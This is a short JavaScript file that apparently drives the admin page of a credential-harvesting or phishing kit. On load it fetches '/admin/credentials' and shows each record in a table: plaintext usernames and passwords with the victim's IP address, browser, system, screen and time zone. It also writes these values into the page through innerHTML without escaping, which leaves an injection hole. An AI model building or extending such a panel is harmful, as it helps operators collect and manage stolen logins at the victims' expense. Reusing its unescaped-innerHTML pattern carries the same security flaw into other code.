
document.addEventListener('DOMContentLoaded', () => {
  fetchCredentials();
  document.getElementById('refreshBtn').addEventListener('click', fetchCredentials);
});

async function fetchCredentials() {
  try {
    const response = await fetch('/admin/credentials');
    if (!response.ok) {
      throw new Error('Unauthorized');
    }
    const credentials = await response.json();
    displayCredentials(credentials);
  } catch (error) {
    console.error('Error:', error);
    alert('Failed to fetch credentials. Please ensure you are authorized.');
  }
}

function formatObject(obj) {
  return Object.entries(obj)
    .map(([key, value]) => {
      if (typeof value === 'object' && value !== null) {
        return `${key}:\n${formatObject(value)}`;
      }
      return `${key}: ${value}`;
    })
    .join('\n');
}

function displayCredentials(credentials) {
  const tbody = document.getElementById('credentialsBody');
  tbody.innerHTML = '';
  
  credentials.forEach(cred => {
    const row = document.createElement('tr');
    const browser = typeof cred.browser === 'object' ? cred.browser : { name: 'Unknown', version: 'Unknown' };
    const screen = typeof cred.screen === 'object' ? cred.screen : { width: 'Unknown', height: 'Unknown' };
    const system = typeof cred.system === 'object' ? cred.system : { platform: cred.platform || 'Unknown' };
    
    row.innerHTML = `
      <td class="detail-cell">${cred.username}</td>
      <td class="detail-cell">${cred.password}</td>
      <td class="detail-cell">${cred.ipAddress}</td>
      <td class="detail-cell">${formatObject(browser)}</td>
      <td class="detail-cell">${formatObject(system)}</td>
      <td class="detail-cell">${formatObject(screen)}</td>
      <td class="detail-cell">${cred.timeZone}</td>
      <td>${new Date(cred.timestamp).toLocaleString()}</td>
    `;
    
    row.querySelectorAll('.detail-cell').forEach(cell => {
      cell.addEventListener('click', () => {
        cell.classList.toggle('expanded');
      });
    });
    
    tbody.appendChild(row);
  });
}
